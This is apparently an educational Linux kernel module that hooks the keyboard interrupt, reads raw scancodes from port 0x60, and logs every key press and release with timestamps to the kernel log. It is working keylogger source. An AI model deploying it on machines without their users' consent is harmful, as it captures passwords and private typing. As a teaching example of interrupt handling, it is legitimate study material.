#include <linux/module.h>
#include <linux/interrupt.h>
#include <linux/workqueue.h>
#include <linux/spinlock.h>
#include <linux/time64.h>
#include <asm/io.h>

#define KBD_IRQ 1
#define KBD_BUFFER_SIZE 128

// IRQ
static int dev_id;

// Workqueue + ring buffer
static struct work_struct kb_work;
static spinlock_t buff_lock;

struct kb_event {
    unsigned long scancode;
    time64_t ts;
};

/* ------------------------------------------------------------------ */
/*                         RING BUFFER IMPL                           */
/* ------------------------------------------------------------------ */

static struct kb_event ring_buff[KBD_BUFFER_SIZE];
static unsigned int ring_head;
static unsigned int ring_tail;
static unsigned int ring_count;

static bool ring_push(unsigned char scancode, time64_t ts)
{
    unsigned long flags;

    spin_lock_irqsave(&buff_lock, flags);

    if (ring_count == KBD_BUFFER_SIZE) {
        ring_tail = (ring_tail + 1) % KBD_BUFFER_SIZE;
        ring_count--;
    }

    ring_buff[ring_head].scancode = scancode;
    ring_buff[ring_head].ts = ts;
    ring_head = (ring_head + 1) % KBD_BUFFER_SIZE;
    ring_count++;

    spin_unlock_irqrestore(&buff_lock, flags);

    return true;
}

static bool ring_pop(struct kb_event *event)
{
    unsigned long flags;

    spin_lock_irqsave(&buff_lock, flags);

    if (ring_count == 0) {
        spin_unlock_irqrestore(&buff_lock, flags);
        return false;
    }

    *event = ring_buff[ring_tail];
    ring_tail = (ring_tail + 1) % KBD_BUFFER_SIZE;
    ring_count--;

    spin_unlock_irqrestore(&buff_lock, flags);

    return true;
}

/* ------------------------------------------------------------------ */
/*                          KEYCODE TABLE                             */
/* ------------------------------------------------------------------ */

static const char *scancode_to_name(unsigned char code)
{
    switch (code) {
    case 0x01: return "ESC";

    case 0x02: return "1";
    case 0x03: return "2";
    case 0x04: return "3";
    case 0x05: return "4";
    case 0x06: return "5";
    case 0x07: return "6";
    case 0x08: return "7";
    case 0x09: return "8";
    case 0x0A: return "9";
    case 0x0B: return "0";
    case 0x0C: return "-";
    case 0x0D: return "=";
    case 0x0E: return "BACKSPACE";
    case 0x0F: return "TAB";

    case 0x10: return "Q";
    case 0x11: return "W";
    case 0x12: return "E";
    case 0x13: return "R";
    case 0x14: return "T";
    case 0x15: return "Y";
    case 0x16: return "U";
    case 0x17: return "I";
    case 0x18: return "O";
    case 0x19: return "P";
    case 0x1A: return "[";
    case 0x1B: return "]";
    case 0x1C: return "ENTER";
    case 0x1D: return "LCTRL";

    case 0x1E: return "A";
    case 0x1F: return "S";
    case 0x20: return "D";
    case 0x21: return "F";
    case 0x22: return "G";
    case 0x23: return "H";
    case 0x24: return "J";
    case 0x25: return "K";
    case 0x26: return "L";
    case 0x27: return ";";
    case 0x28: return "'";
    case 0x29: return "`";
    case 0x2A: return "LSHIFT";
    case 0x2B: return "\\";
    case 0x2C: return "Z";
    case 0x2D: return "X";
    case 0x2E: return "C";
    case 0x2F: return "V";
    case 0x30: return "B";
    case 0x31: return "N";
    case 0x32: return "M";
    case 0x33: return ",";
    case 0x34: return ".";
    case 0x35: return "/";
    case 0x36: return "RSHIFT";
    case 0x37: return "KP_*";
    case 0x38: return "LALT";
    case 0x39: return "SPACE";
    case 0x3A: return "CAPSLOCK";

    case 0x3B: return "F1";
    case 0x3C: return "F2";
    case 0x3D: return "F3";
    case 0x3E: return "F4";
    case 0x3F: return "F5";
    case 0x40: return "F6";
    case 0x41: return "F7";
    case 0x42: return "F8";
    case 0x43: return "F9";
    case 0x44: return "F10";

    case 0x45: return "NUMLOCK";
    case 0x46: return "SCROLLLOCK";

    case 0x47: return "KP_7";
    case 0x48: return "KP_8";
    case 0x49: return "KP_9";
    case 0x4A: return "KP_-";
    case 0x4B: return "KP_4";
    case 0x4C: return "KP_5";
    case 0x4D: return "KP_6";
    case 0x4E: return "KP_+";
    case 0x4F: return "KP_1";
    case 0x50: return "KP_2";
    case 0x51: return "KP_3";
    case 0x52: return "KP_0";
    case 0x53: return "KP_.";

    case 0x57: return "F11";
    case 0x58: return "F12";

    default:   return "UNKNOWN";
    }
}

/* ------------------------------------------------------------------ */
/*                           IRQ HANDLER                              */
/* ------------------------------------------------------------------ */

static void kb_work_handler(struct work_struct *work)
{
    struct kb_event event;

    while (ring_pop(&event)) {
        unsigned char scancode;
        unsigned char code;
        bool pressed;
        const char *key_name;

        scancode = event.scancode;
        pressed = !(scancode & 0x80);
        code = scancode & 0x7f;
        key_name = scancode_to_name(code);

        pr_info("kbd_monitor: ts=%llu raw=0x%02x -> code=0x%02x type=%s key=%s\n",
                event.ts, scancode, code, pressed ? "press" : "release", key_name);
    }
}

static irqreturn_t kb_irq(int irq, void *dev)
{
    unsigned char scancode;
    time64_t ts;

    scancode = inb(0x60);
    ts = ktime_get_ns();;

    ring_push(scancode, ts);
    schedule_work(&kb_work);

    return IRQ_HANDLED;
}

/* ------------------------------------------------------------------ */
/*                        MODULE INIT/EXIT                            */
/* ------------------------------------------------------------------ */

static int __init kb_init(void)
{
    int ret;

    ring_head = 0;
    ring_tail = 0;
    ring_count = 0;
    spin_lock_init(&buff_lock);
    INIT_WORK(&kb_work, kb_work_handler);

    ret = request_irq(
        KBD_IRQ,
        kb_irq,
        IRQF_SHARED,
        "edu_kbd_monitor",
        &dev_id
    );

    if (ret) {
        pr_err("failed to register irq\n");
        return ret;
    }

    pr_info("keyboard monitor loaded\n");

    return 0;
}

static void __exit kb_exit(void)
{
    cancel_work_sync(&kb_work);
    free_irq(KBD_IRQ, &dev_id);

    pr_info("keyboard monitor unloaded\n");
}

module_init(kb_init);
module_exit(kb_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CD7567");
MODULE_DESCRIPTION("Educational keyboard logger");
